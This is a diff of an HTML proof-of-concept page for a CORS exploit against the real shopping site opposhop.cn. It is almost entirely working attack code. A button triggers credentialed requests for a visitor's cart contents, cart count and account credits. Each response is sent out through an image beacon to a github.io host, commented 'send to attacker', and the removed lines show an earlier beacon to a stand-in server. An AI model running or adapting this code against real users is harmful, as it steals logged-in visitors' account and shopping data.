@@ -1,43 +1,119 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>CORS Sandbox PoC</title>
+<title>OPPO CORS Exploit PoC</title>
+
+<style>
+body{
+  font-family: Arial;
+  background:#eef2f7;
+  padding:30px;
+}
+
+.container{
+  max-width:1000px;
+  margin:auto;
+}
+
+h1{
+  text-align:center;
+}
+
+button{
+  display:block;
+  margin:20px auto;
+  padding:10px 25px;
+  background:#2e7df6;
+  color:white;
+  border:none;
+  cursor:pointer;
+}
+
+.card{
+  background:white;
+  padding:15px;
+  margin:15px 0;
+  border-radius:8px;
+}
+
+pre{
+  background:#f5f6f8;
+  padding:10px;
+  overflow:auto;
+}
+</style>
 </head>
 
 <body>
 
-<h2>Loading...</h2>
+<div class="container">
 
-<iframe id="frame" sandbox="allow-scripts allow-same-origin" style="display:none;"></iframe>
+<h1>OPPO CORS Exploit Proof of Concept</h1>
+
+<button onclick="run()">Run Exploit</button>
+
+<div class="card">
+<h3>Cart</h3>
+<pre id="cart">Waiting...</pre>
+</div>
+
+<div class="card">
+<h3>Count</h3>
+<pre id="count">Waiting...</pre>
+</div>
+
+<div class="card">
+<h3>Credits</h3>
+<pre id="credits">Waiting...</pre>
+</div>
+
+</div>
 
 <script>
 
-function log(data){
-    let img = new Image();
-    img.src = "https://your-server.com/log?d=" + btoa(data);
+function exfiltrate(label, data){
+  new Image().src = "tohamisamrael.github.io/oppo-cors-poc.html/?d=" + btoa(label + ":" + data);
 }
 
-async function exploit(){
-    try{
+function fetchData(url, elementId, label){
+  fetch(url, {
+    method: "GET",
+    credentials: "include"
+  })
+  .then(res => res.text())
+  .then(data => {
+    document.getElementById(elementId).textContent = data;
 
-        let res = await fetch("https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount", {
-            method: "GET",
-            credentials: "include"
-        });
-
-        let text = await res.text();
-
-        document.body.innerHTML += "<pre>"+text+"</pre>";
-
-        log("SUCCESS: " + text);
-
-    }catch(e){
-        log("ERROR: " + e);
-    }
+    // send to attacker
+    exfiltrate(label, data);
+  })
+  .catch(err => {
+    document.getElementById(elementId).textContent = "Error: " + err;
+  });
 }
 
-exploit();
+function run(){
+
+  fetchData(
+    "https://www.opposhop.cn/cn/m/oapi/orders/web/cart/detail",
+    "cart",
+    "cart"
+  );
+
+  fetchData(
+    "https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",
+    "count",
+    "count"
+  );
+
+  fetchData(
+    "https://www.opposhop.cn/cn/m/oapi/user/credits",
+    "credits",
+    "credits"
+  );
+
+}
 
 </script>
 
